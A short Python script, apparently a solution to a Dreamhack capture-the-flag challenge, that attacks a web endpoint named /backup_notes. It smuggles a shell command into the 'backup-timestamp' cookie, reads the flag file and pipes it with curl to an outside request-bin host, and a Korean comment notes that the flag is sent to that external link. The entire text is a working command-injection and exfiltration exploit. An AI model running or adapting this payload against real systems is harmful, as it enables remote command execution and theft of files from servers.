import requests
from urllib import parse

url = "http://host3.dreamhack.games:21740/backup_notes"
request_bin = "https://skajljw.request.dreamhack.games"

hack = ' && cat flag | curl -X POST -H "Content-Type: text/plain" --data-binary @- '+ request_bin

result=requests.post(url,cookies={"backup-timestamp":hack}) # 요청을 보내면 플래그 내용이 외부 링크로 전송된다.
print(result)